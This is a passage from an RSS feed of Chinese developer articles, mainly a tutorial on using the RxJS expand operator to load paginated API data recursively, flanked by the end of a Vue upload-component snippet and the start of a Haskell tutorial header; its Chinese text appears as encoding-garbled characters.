    <span class="hljs-tag">&lt;<span class="hljs-name">ImageUpload</span> <span class="hljs-attr">:</span>=<span class="hljs-string">"$attrs"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"phone-upload"</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">"{ preview: $slots.preview }"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">slot</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"preview"</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"$slots.preview &amp;&amp; $attrs.modelValue"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">slot</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">slot</span> <span class="hljs-attr">v-else-if</span>=<span class="hljs-string">"$slots.default"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">slot</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">el-icon</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"avatar-uploader-icon"</span> <span class="hljs-attr">v-else</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">Plus</span> /&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">el-icon</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">ImageUpload</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref } <span class="hljs-keyword">from</span> <span class="hljs-string">"vue"</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ImageUpload</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"../ImageUpload/index.vue"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Plus</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"@element-plus/icons-vue"</span>;
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"scss"</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.phone-upload</span> {
    :<span class="hljs-built_in">deep</span>(.el-upload-list__item-actions) {
        <span class="hljs-attribute">opacity</span>: <span class="hljs-number">1</span> <span class="hljs-meta">!important</span>;
        <span class="hljs-attribute">background</span>: none;
    }
    &amp;<span class="hljs-selector-class">.preview</span> {
        :<span class="hljs-built_in">deep</span>(.el-upload--picture-card) {
            <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
            <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;
        }
    }

    :<span class="hljs-built_in">deep</span>(.el-upload-list__item-preview) {
        <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0</span> <span class="hljs-meta">!important</span>;
        <span class="hljs-attribute">display</span>: block;
        <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
        <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;
    }

    :<span class="hljs-built_in">deep</span>(.el-upload-list__item-status-label) {
        <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0</span>;
    }

    :<span class="hljs-built_in">deep</span>(.el-icon--close-tip) {
        <span class="hljs-attribute">display</span>: none <span class="hljs-meta">!important</span>;
    }

    :<span class="hljs-built_in">deep</span>(.el-upload-list__item-delete) {
        <span class="hljs-attribute">position</span>: absolute;
        <span class="hljs-attribute">right</span>: <span class="hljs-number">0</span>;
        <span class="hljs-attribute">top</span>: <span class="hljs-number">0</span>;
        <span class="hljs-attribute">width</span>: <span class="hljs-number">28px</span>;
        <span class="hljs-attribute">height</span>: <span class="hljs-number">28px</span>;
        <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">24px</span>;
        <span class="hljs-attribute">background</span>: <span class="hljs-number">#000000</span>;
        <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.7</span>;
        <span class="hljs-attribute">display</span>: flex;
        <span class="hljs-attribute">justify-content</span>: center;
        <span class="hljs-attribute">align-items</span>: center;
        <span class="hljs-selector-class">.el-icon</span> {
            <span class="hljs-attribute">margin-left</span>: <span class="hljs-number">6px</span>;

            svg {
                <span class="hljs-attribute">font-size</span>: <span class="hljs-number">18px</span>;
            }
        }
    }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[20ä¸ªä¾‹å­æŒæ¡RxJSâ€”â€”ç¬¬ä¸€ç« ä½¿ç”¨ expand æ“ä½œç¬¦å®ç°é“¾å¼é€’å½’è¯·æ±‚]]></title>    <link>https://juejin.cn/post/7600469605476925482</link>    <guid>https://juejin.cn/post/7600469605476925482</guid>    <pubDate>2026-01-29T08:58:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600469605476925482" data-draft-id="7600602502632652841" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="20ä¸ªä¾‹å­æŒæ¡RxJSâ€”â€”ç¬¬ä¸€ç« ä½¿ç”¨ expand æ“ä½œç¬¦å®ç°é“¾å¼é€’å½’è¯·æ±‚"/> <meta itemprop="keywords" content="Angular.js,RxJS"/> <meta itemprop="datePublished" content="2026-01-29T08:58:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LeeYaMaster"/> <meta itemprop="url" content="https://juejin.cn/user/2348212565583085"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            20ä¸ªä¾‹å­æŒæ¡RxJSâ€”â€”ç¬¬ä¸€ç« ä½¿ç”¨ expand æ“ä½œç¬¦å®ç°é“¾å¼é€’å½’è¯·æ±‚
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2348212565583085/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LeeYaMaster
  </span> <!----> <!----> <div class="vip-level" data-v-cd7d0a50="" data-v-292f6e48=""><span class="tooltip" data-v-cd7d0a50=""><div class="byte-tooltip byte-tooltip--dark" style="display:none;">
        VIP.1 åˆå­¦ä¹ç»ƒ
      </div><span class="byte-tooltip__wrapper"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8AQMAAAAAMksxAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAAA5JREFUKM9jGAWjAAcAAAIcAAE27nY6AAAAAElFTkSuQmCC" alt="VIP.1 åˆå­¦ä¹ç»ƒ" title="VIP.1 åˆå­¦ä¹ç»ƒ" class="lazy" style="aspect-ratio:NaN;" data-v-5244ef91="" data-v-cd7d0a50=""/></span></span></div> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T08:58:14.000Z" title="Thu Jan 29 2026 08:58:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">RxJS å®æˆ˜ï¼šä½¿ç”¨ expand æ“ä½œç¬¦å®ç°é“¾å¼é€’å½’è¯·æ±‚</h2>
<h3 data-id="heading-1">æ¦‚è¿°</h3>
<p>åœ¨å®é™…å¼€å‘ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦å¤„ç†åˆ†é¡µæ•°æ®ã€‚æœ‰æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦ä¸€æ¬¡æ€§åŠ è½½å¤šé¡µæ•°æ®ï¼Œè€Œä¸æ˜¯ç­‰å¾…ç”¨æˆ·ç‚¹å‡»"ä¸‹ä¸€é¡µ"ã€‚æœ¬ç« å°†ä»‹ç»å¦‚ä½•ä½¿ç”¨ RxJS çš„ <code>expand</code> æ“ä½œç¬¦æ¥å®ç°é“¾å¼é€’å½’è¯·æ±‚ï¼Œè‡ªåŠ¨åŠ è½½å¤šé¡µæ•°æ®ã€‚</p>
<h3 data-id="heading-2">expand æ“ä½œç¬¦ç®€ä»‹</h3>
<p><code>expand</code> æ˜¯ RxJS ä¸­ä¸€ä¸ªå¼ºå¤§çš„æ“ä½œç¬¦ï¼Œå®ƒå¯ä»¥å°†ä¸€ä¸ª Observable çš„å€¼é€’å½’åœ°å±•å¼€ä¸ºæ–°çš„ Observableã€‚æ¯æ¬¡å±•å¼€æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®å½“å‰å€¼å†³å®šæ˜¯å¦ç»§ç»­é€’å½’ï¼Œæˆ–è€…è¿”å› <code>EMPTY</code> æ¥ç»ˆæ­¢é€’å½’ã€‚</p>
<h4 data-id="heading-3">åŸºæœ¬è¯­æ³•</h4>
<pre><code class="hljs language-typescript" lang="typescript">source$.<span class="hljs-title function_">pipe</span>(
  <span class="hljs-title function_">expand</span>(<span class="hljs-function">(<span class="hljs-params">value, index</span>) =&gt;</span> {
    <span class="hljs-comment">// æ ¹æ® value å’Œ index å†³å®šæ˜¯å¦ç»§ç»­</span>
    <span class="hljs-keyword">if</span> (shouldContinue) {
      <span class="hljs-keyword">return</span> nextObservable$;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-variable constant_">EMPTY</span>; <span class="hljs-comment">// ç»ˆæ­¢é€’å½’</span>
  })
)
</code></pre>
<h3 data-id="heading-4">å®æˆ˜åœºæ™¯ï¼šé€’å½’åŠ è½½åˆ†é¡µæ•°æ®</h3>
<p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªåˆ†é¡µ APIï¼Œéœ€è¦ä¸€æ¬¡æ€§åŠ è½½å‰ 10 é¡µçš„æ•°æ®ã€‚ä½¿ç”¨ <code>expand</code> å¯ä»¥ä¼˜é›…åœ°å®ç°è¿™ä¸ªéœ€æ±‚ã€‚</p>
<h4 data-id="heading-5">å®ç°æ€è·¯</h4>
<ol>
<li>å‘èµ·ç¬¬ä¸€é¡µè¯·æ±‚</li>
<li>ä½¿ç”¨ <code>expand</code> é€’å½’åœ°è¯·æ±‚ä¸‹ä¸€é¡µ</li>
<li>å½“è¾¾åˆ°æŒ‡å®šé¡µæ•°æ—¶ï¼Œè¿”å› <code>EMPTY</code> ç»ˆæ­¢é€’å½’</li>
<li>ä½¿ç”¨ <code>toArray()</code> æ”¶é›†æ‰€æœ‰å“åº”</li>
<li>åˆå¹¶æ‰€æœ‰å“åº”çš„æ•°æ®</li>
</ol>
<h4 data-id="heading-6">æ ¸å¿ƒä»£ç </h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">let</span> currentPage = <span class="hljs-variable language_">this</span>.<span class="hljs-property">page</span>;
<span class="hljs-keyword">const</span> params = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpParams</span>()
  .<span class="hljs-title function_">set</span>(<span class="hljs-string">'page'</span>, currentPage.<span class="hljs-title function_">toString</span>())
  .<span class="hljs-title function_">set</span>(<span class="hljs-string">'pageSize'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">pageSize</span>.<span class="hljs-title function_">toString</span>());

<span class="hljs-variable language_">this</span>.<span class="hljs-property">http</span>.<span class="hljs-property">get</span>&lt;<span class="hljs-title class_">ApiResponse</span>&gt;(<span class="hljs-variable language_">this</span>.<span class="hljs-property">apiUrl</span>, { params })
  .<span class="hljs-title function_">pipe</span>(
    <span class="hljs-title function_">expand</span>(<span class="hljs-function">(<span class="hljs-params">response, index</span>) =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'expandæ¡ä»¶: index'</span>, index);
      <span class="hljs-comment">// index ä» 0 å¼€å§‹ï¼Œæ‰€ä»¥ index &gt;= 9 è¡¨ç¤ºå·²ç»è¯·æ±‚äº†10é¡µï¼ˆç´¢å¼•0-9ï¼‰</span>
      <span class="hljs-keyword">if</span> (index &gt;= <span class="hljs-number">9</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-variable constant_">EMPTY</span>; <span class="hljs-comment">// ç»ˆæ­¢é€’å½’</span>
      }
      <span class="hljs-comment">// é€’å¢é¡µç </span>
      currentPage = currentPage + <span class="hljs-number">1</span>;
      <span class="hljs-keyword">const</span> nextParams = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpParams</span>()
        .<span class="hljs-title function_">set</span>(<span class="hljs-string">'page'</span>, currentPage.<span class="hljs-title function_">toString</span>())
        .<span class="hljs-title function_">set</span>(<span class="hljs-string">'pageSize'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">pageSize</span>.<span class="hljs-title function_">toString</span>());
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">http</span>.<span class="hljs-property">get</span>&lt;<span class="hljs-title class_">ApiResponse</span>&gt;(<span class="hljs-variable language_">this</span>.<span class="hljs-property">apiUrl</span>, { <span class="hljs-attr">params</span>: nextParams });
    }),
    <span class="hljs-title function_">toArray</span>(), <span class="hljs-comment">// æ”¶é›†æ‰€æœ‰å“åº”</span>
    <span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">responses</span>) =&gt;</span> {
      <span class="hljs-comment">// åˆå¹¶æ‰€æœ‰å“åº”çš„æ•°æ®</span>
      <span class="hljs-keyword">const</span> <span class="hljs-attr">allItems</span>: <span class="hljs-title class_">DataItem</span>[] = [];
      <span class="hljs-keyword">let</span> total = <span class="hljs-number">0</span>;
      responses.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">response</span>) =&gt;</span> {
        <span class="hljs-keyword">if</span> (response.<span class="hljs-property">success</span>) {
          allItems.<span class="hljs-title function_">push</span>(...response.<span class="hljs-property">data</span>.<span class="hljs-property">items</span>);
          total = response.<span class="hljs-property">data</span>.<span class="hljs-property">pagination</span>.<span class="hljs-property">total</span>;
        }
      });
      <span class="hljs-keyword">return</span> { <span class="hljs-attr">items</span>: allItems, total };
    })
  )
  .<span class="hljs-title function_">subscribe</span>({
    <span class="hljs-attr">next</span>: <span class="hljs-function">(<span class="hljs-params">result</span>) =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">listOfData</span> = result.<span class="hljs-property">items</span>;
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">total</span> = result.<span class="hljs-property">total</span>;
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å·²åŠ è½½ <span class="hljs-subst">${result.items.length}</span> æ¡æ•°æ®`</span>);
    },
    <span class="hljs-attr">error</span>: <span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'åŠ è½½æ•°æ®å¤±è´¥:'</span>, error);
    }
  });
</code></pre>
<h3 data-id="heading-7">å…³é”®ç‚¹è§£æ</h3>
<h4 data-id="heading-8">1. expand çš„ index å‚æ•°</h4>
<p><code>expand</code> æ“ä½œç¬¦çš„ç¬¬äºŒä¸ªå‚æ•° <code>index</code> ä» 0 å¼€å§‹è®¡æ•°ï¼Œè¡¨ç¤ºå½“å‰æ˜¯ç¬¬å‡ æ¬¡å±•å¼€ï¼ˆä¸åŒ…æ‹¬åˆå§‹å€¼ï¼‰ã€‚æ‰€ä»¥ï¼š</p>
<ul>
<li>ç¬¬ä¸€æ¬¡å±•å¼€ï¼š<code>index = 0</code>ï¼ˆå¯¹åº”ç¬¬ 2 é¡µï¼‰</li>
<li>ç¬¬äºŒæ¬¡å±•å¼€ï¼š<code>index = 1</code>ï¼ˆå¯¹åº”ç¬¬ 3 é¡µï¼‰</li>
<li>...</li>
<li>ç¬¬ä¹æ¬¡å±•å¼€ï¼š<code>index = 9</code>ï¼ˆå¯¹åº”ç¬¬ 11 é¡µï¼‰</li>
</ul>
<p>å› æ­¤ï¼Œè¦åŠ è½½ 10 é¡µæ•°æ®ï¼Œæ¡ä»¶åº”è¯¥æ˜¯ <code>index &gt;= 9</code>ã€‚</p>
<h4 data-id="heading-9">2. ç»ˆæ­¢æ¡ä»¶</h4>
<p>å½“æ»¡è¶³ç»ˆæ­¢æ¡ä»¶æ—¶ï¼Œè¿”å› <code>EMPTY</code> Observableï¼Œè¿™ä¼šç«‹å³å®Œæˆï¼Œä¸å†ç»§ç»­é€’å½’ã€‚</p>
<h4 data-id="heading-10">3. toArray() çš„ä½œç”¨</h4>
<p><code>toArray()</code> ä¼šå°† Observable æµä¸­çš„æ‰€æœ‰å€¼æ”¶é›†åˆ°ä¸€ä¸ªæ•°ç»„ä¸­ã€‚è¿™å¯¹äºéœ€è¦å¤„ç†æ‰€æœ‰å“åº”çš„æƒ…å†µéå¸¸æœ‰ç”¨ã€‚</p>
<h4 data-id="heading-11">4. ä¸ take() çš„åŒºåˆ«</h4>
<p>è™½ç„¶å¯ä»¥ä½¿ç”¨ <code>take(10)</code> æ¥é™åˆ¶è¯·æ±‚æ¬¡æ•°ï¼Œä½†æ›´å¥½çš„åšæ³•æ˜¯åœ¨ <code>expand</code> å†…éƒ¨åˆ¤æ–­ç»ˆæ­¢æ¡ä»¶ï¼Œè¿™æ ·å¯ä»¥æ›´ç²¾ç¡®åœ°æ§åˆ¶é€’å½’é€»è¾‘ã€‚</p>
<h3 data-id="heading-12">ä¼˜åŠ¿</h3>
<ol>
<li><strong>ä»£ç ç®€æ´</strong>ï¼šä½¿ç”¨ <code>expand</code> å¯ä»¥é¿å…å¤æ‚çš„å¾ªç¯å’Œ Promise é“¾</li>
<li><strong>è‡ªåŠ¨å¤„ç†</strong>ï¼šé€’å½’é€»è¾‘ç”± RxJS è‡ªåŠ¨ç®¡ç†ï¼Œæ— éœ€æ‰‹åŠ¨ç»´æŠ¤çŠ¶æ€</li>
<li><strong>æ˜“äºæ‰©å±•</strong>ï¼šå¯ä»¥è½»æ¾ä¿®æ”¹ç»ˆæ­¢æ¡ä»¶ï¼Œæ¯”å¦‚æ ¹æ®å“åº”æ•°æ®å†³å®šæ˜¯å¦ç»§ç»­</li>
</ol>
<h3 data-id="heading-13">æ³¨æ„äº‹é¡¹</h3>
<ol>
<li><strong>å†…å­˜å ç”¨</strong>ï¼šå¦‚æœé€’å½’æ¬¡æ•°è¿‡å¤šï¼Œå¯èƒ½ä¼šå ç”¨å¤§é‡å†…å­˜ï¼Œéœ€è¦æ³¨æ„</li>
<li><strong>é”™è¯¯å¤„ç†</strong>ï¼šå¦‚æœä¸­é—´æŸä¸ªè¯·æ±‚å¤±è´¥ï¼Œæ•´ä¸ªæµä¼šä¸­æ–­ï¼Œéœ€è¦é€‚å½“çš„é”™è¯¯å¤„ç†</li>
<li><strong>æ€§èƒ½è€ƒè™‘</strong>ï¼šé€’å½’è¯·æ±‚æ˜¯ä¸²è¡Œçš„ï¼Œå¦‚æœæ•°æ®é‡å¤§ï¼Œå¯èƒ½éœ€è¦è€ƒè™‘å¹¶å‘è¯·æ±‚ï¼ˆä½¿ç”¨ <code>forkJoin</code>ï¼‰</li>
</ol>
<h3 data-id="heading-14">æ€»ç»“</h3>
<p><code>expand</code> æ“ä½œç¬¦æ˜¯å¤„ç†é€’å½’è¯·æ±‚åœºæ™¯çš„åˆ©å™¨ã€‚é€šè¿‡å®ƒï¼Œæˆ‘ä»¬å¯ä»¥ä¼˜é›…åœ°å®ç°é“¾å¼é€’å½’è¯·æ±‚ï¼Œè‡ªåŠ¨åŠ è½½å¤šé¡µæ•°æ®ã€‚åœ¨å®é™…é¡¹ç›®ä¸­ï¼Œæ ¹æ®å…·ä½“éœ€æ±‚é€‰æ‹©åˆé€‚çš„ç­–ç•¥ï¼Œæ—¢èƒ½ä¿è¯ä»£ç çš„å¯è¯»æ€§ï¼Œåˆèƒ½æ»¡è¶³æ€§èƒ½è¦æ±‚ã€‚</p>
<p>ç äº‘åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fleeyamaster%2Frxjs-examples" target="_blank" title="https://gitee.com/leeyamaster/rxjs-examples" ref="nofollow noopener noreferrer">gitee.com/leeyamasterâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€çœ‹å°±æ‡‚çš„ Haskell æ•™ç¨‹ - åŸºç¡€è¿ç®—]]></title>    <link>https://juejin.cn/post/7600426046425169955</link>    <guid>https://juejin.cn/post/7600426046425169955</guid>    <pubDate>2026-01-29T08:57:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600426046425169955" data-draft-id="7600355625474179124" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€çœ‹å°±æ‡‚çš„ Haskell æ•™ç¨‹ - åŸºç¡€è¿ç®—"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-29T08:57:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Anita_Sun"/> <meta itemprop="url" content="https://juejin.cn/user/1811635884786839"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€çœ‹å°±æ‡‚çš„ Haskell æ•™ç¨‹ - åŸºç¡€è¿ç®—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1811635884786839/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Anita_Sun
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T08:57:13.000Z" title="Thu Jan 29 2026 08:57:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
